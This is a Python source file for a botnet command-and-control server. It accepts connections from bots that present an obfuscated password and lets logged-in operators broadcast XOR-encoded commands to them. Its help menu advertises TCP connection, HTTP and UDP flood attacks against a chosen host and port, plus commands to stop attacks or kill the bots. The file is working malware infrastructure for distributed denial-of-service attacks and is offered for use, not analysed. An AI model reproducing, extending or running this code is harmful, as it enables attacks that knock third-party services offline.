#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
#Code by LeeOn123
#Updated at 15/7/2019
#====================================================================#
# ____        _   _                   ____        _              _   #
#|  _ \ _   _| |_| |__   ___  _ __   | __ )  ___ | |_ _ __   ___| |_ #
#| |_) | | | | __| '_ \ / _ \| '_ \  |  _ \ / _ \| __| '_ \ / _ \ __|#
#|  __/| |_| | |_| | | | (_) | | | | | |_) | (_) | |_| | | |  __/ |_ #
#|_|    \__, |\__|_| |_|\___/|_| |_| |____/ \___/ \__|_| |_|\___|\__|#
#       |___/                                                        #
#====================================================================#
#                         ~ version 2.1 ~                            #
######################################################################
import socket
import argparse
import threading
import os
import time
import sys
from os import system, name
import base64 as b64

key= "asdfghjkloiuytresxcvbnmliuytf"#xor key

if len(sys.argv)<=1:
	print("Usage: python3 cnc.py <port>")
	sys.exit()

b = int(sys.argv[1])

socketList = []
def sendCmd(cmd):#Send Commands Module
	print('[*]Command sent!!!')#debug
	print(cmd)
	data = xor_enc(cmd,key)#encode
	for sock in socketList:
		try:
			sock.settimeout(1)
			sock.send(data.encode())
		except:
			socketList.remove(sock)#del error connection
			print("[!] A bot offline")

def scan_device():#scan online device
	print('scanning Online bot')
	for sock in socketList:
		try:
			sock.settimeout(1)
			sock.send(xor_enc("ping",key).encode())#check connection
		except:
			socketList.remove(sock)#del error connection
			print("[!] A bot offline")#debug

def showbot():#bot count
	while True:
		try:
			so.send(("\033]0;Nodes : "+str(len(socketList))+" \007").encode())
			time.sleep(1)
		except:
			return

def handle_bot(sock,socketList):
	while True:
		try:
			sock.send(xor_enc("ping",key).encode())#keepalive and check connection
			print("ping")
			pong = sock.recv(1024).decode()
			if xor_dec(pong,key) == "pong":
				print("pong")
				time.sleep(60)#check connection every min
		except:
			try:
				sock.close()
				socketList.remove(sock)
				print("[!] A bot offline")
			except:#bug happened here, if not add "break" then there will be a "magic" loop
				pass
			break

def waitConnect(sock,addr):
	passwd = sock.recv(1024).decode()
	try:
		passwd2 = xor_dec(passwd,key) 
		if passwd2 == "1337" :
			if sock not in socketList:
				socketList.append(sock)
				print("[!] A bot Online "+ str(addr)) #message
				handle_bot(sock,socketList)
		else:
			sock.close()
	except:
		if passwd == "Login\r\n" or passwd == "Login":#login code
		#If u are using putty pls use raw mode to connect, 
		#If connected, there will not show anything on screen
		#Just input 'Login' and enter.
			print("Somebody login...")
			Commander(sock)
		else:
			sock.close()

def Commander(sock):#cnc server
	global so
	so = sock
	sock.send("Username:".encode())
	name = sock.recv(1024).decode()
	sock.send("Password:".encode())
	passwd = sock.recv(1024).decode()
	tmp = open("login.txt").readlines()#enter ur username and password in login.txt
	corret=0
	for x in tmp:
		tmp2 = x.split()
		#print(tmp2[0])#debug
		#print(tmp2[1])#
		if tmp2[0]+"\r\n" == name and tmp2[1]+"\r\n" == passwd:
			print("Commander here: "+tmp2[0])
			corret+=1
	if corret != 1:
		sock.close()
		return
	sock.send("Setting up the server\r\n".encode())#loading sense
	time.sleep(0.5)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [\\]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [/]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [\\]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [-]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("Setting up the server [/]\r\n".encode())
	time.sleep(0.3)
	sock.send("\033[2J\033[1H".encode())
	sock.send("[!] Setting Up Connection Socket...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Updating Server Config...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Setting Up C&C Module...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Done...\r\n".encode())
	time.sleep(0.5)
	sock.send("[!] Welcom to the Python3 C&C Server, glhf !!!\r\n".encode())
	sock.send("==============================================\r\n".encode())
	time.sleep(1)
	botn = threading.Thread(target=showbot)
	botn.start()


	while True:
		#print ("==> Python3 C&C server <==")
		sock.send('ルート@ボットネット:'.encode())#if u run this on windows, it may has some bug, idk why so,i use linux.
		cmd_str = sock.recv(1024).decode()
		if len(cmd_str):
			if cmd_str[0] == '!':
				sendCmd(cmd_str)
			if cmd_str[0] == 'scan':
				scan_device()
			if cmd_str == '?' or cmd_str == 'help' or cmd_str == '?\r\n' or cmd_str == 'help\r\n':
				sock.send('\r\n#-- Commands --#\r\n'.encode())
				sock.send('  CC   Flood: !cc   host port threads\r\n'.encode())         #tcp connection flood
				sock.send('  HTTP Flood: !http host port threads path\r\n'.encode())    #http flood
				sock.send('  UDP  Flood: !udp  host port threads size\r\n\r\n'.encode())#udp flood
				sock.send('    !stop    : stop attack\r\n'.encode())
				sock.send('    !kill    : kill all the bots\r\n'.encode())
				sock.send('    bots     : count bot\r\n'.encode())
				sock.send('    scan     : check online connection\r\n'.encode())#check connecton status, if some offline or timeout will delete them form bot list.
				sock.send('    clear    : Clear screen\r\n'.encode())
				sock.send('    exit     : exit the server\r\n'.encode())
				sock.send('    shutdown : shutdown the server\r\n'.encode())
				sock.send('=============================================================\r\n'.encode())
			if cmd_str == 'bots' or cmd_str == 'bots\r\n':
				sock.send(("Nodes:"+str(len(socketList))+"\r\n").encode())
			if cmd_str == 'clear' or cmd_str == 'clear\r\n':
				sock.send("\033[2J\033[1H".encode())
			if cmd_str == 'exit' or cmd_str == 'exit\r\n':
				sock.send('Bye, ルート\r\n'.encode())
				stop = True
				sock.close()
				break
			if cmd_str == 'shutdown' or cmd_str == 'shutdown\r\n':#shutdown function
				sock.send('Shutdown\r\n'.encode())
				stop = True
				sock.close()
				print("shutdown from remote command")
				sys.exit()

def main():
	global s
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)#Keepalive tcp connection
	s.bind(('0.0.0.0',b))
	s.listen(1024)
	while True:
		sock, addr = s.accept()
		th = threading.Thread(target=waitConnect,args=(sock,addr))
		th.start()

def xor_enc(string,key):
    lkey=len(key)
    secret=[]
    num=0
    for each in string:
        if num>=lkey:
            num=num%lkey
        secret.append( chr( ord(each)^ord(key[num]) ) )
        num+=1

    return b64.b64encode( "".join( secret ).encode() ).decode()

def xor_dec(string,key):
    leter = b64.b64decode( string.encode() ).decode()
    lkey=len(key)
    string=[]
    num=0
    for each in leter:
        if num>=lkey:
            num=num%lkey

        string.append( chr( ord(each)^ord(key[num]) ) )
        num+=1

    return "".join( string )

if __name__ == '__main__':
	main()
